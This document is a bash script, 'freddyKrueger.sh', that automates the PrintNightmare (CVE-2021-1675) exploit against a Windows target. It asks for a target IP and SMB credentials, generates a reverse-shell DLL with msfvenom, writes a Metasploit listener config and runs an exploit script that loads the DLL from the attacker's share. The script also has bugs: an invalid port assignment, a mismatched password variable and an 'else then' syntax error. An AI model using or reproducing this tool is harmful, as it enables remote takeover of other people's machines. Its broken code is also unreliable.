#!/bin/bash

red="\e[0;91m"
blue="\e[0;94m"
green="\e[0;92m"
yellow="\e[0;33m"
purple="\e[45m"
white='\033[1;37m'
reset="\e[0m"

echo -e "   ${white} _____________"
echo -e "   /   Welcome   \ "
echo -e "   !      To     ! "
echo -e "   ! ${red}SpringsWood${white} ! "
echo -e "   \_____________/ "
echo -e "         ! ! "
echo -e "         ! !  =[ ${red}Freddy Krueger${reset} >"
echo -e "        ${white} ! !${green}// ${white}[ ${red}PrintNightmare ${white}Exploiter${reset} >"

echo -e "${yellow}[*] Target IP Address"
read -p "    0=freddy(victim)> " target
echo -e "${yellow}[*] Target SMB Username: "
read -p "    0=freddy(smb/user)> " user
echo -e "${yellow}[*] Target SMB Password: "
read -p "    0=freddy(smb/pass)> " pass

echo -e "${blue}[*] Grabbing internal hostname"
sleep 2
ipaddr=$(hostname -I | awk '{print $1}')
echo -e "${green} IPv4 Address: ${white}$ipaddr${reset}"

echo -e "${yellow}[*] Enter Port Number(default 4444): "
read -p "    0=freddy(port)> "
if [ -z "$port" ]
then
        $port=4444
fi

clear

echo -e "${blue}[*] Creating Payload${reset}"
sleep 1
msfvenom -p windows/x64/reverse_shell_tcp LHOST=$ipaddr LPORT=$port -o elmStreet.dll
echo -e "${green} Payload created.. ${red}elmStreet.dll${reset}"

# listener
touch dreams.rc
        echo "use exploit/multi/handler
        set PAYLOAD windows/x64/shell_reverse_tcp
        set LHOST $ipaddr
        set LPORT $port
        set ExitOnSession false
        exploit -j -z" > dreams.rc

echo -e "${green}[*] Listener Created.. dreams.rc${reset}"
sleep 2
clear

echo "${blue} freddyKrueger.sh must be in CVE directory to run exploit${reset}"
read -r -p "[?] Run Exploit on ${red}$target${reset}" exploit
if [[ $exploit =~ ^[Yy]$ ]]
then
        sudo ./CVE-2021-1675.py PRINTNIGHTMARE.local/$user:$password@$target '\\$ipaddr\smb\elmStreet.dll'
else
then
        echo "${red}Exiting.. ${blue}Hack The Gibson!"
fi
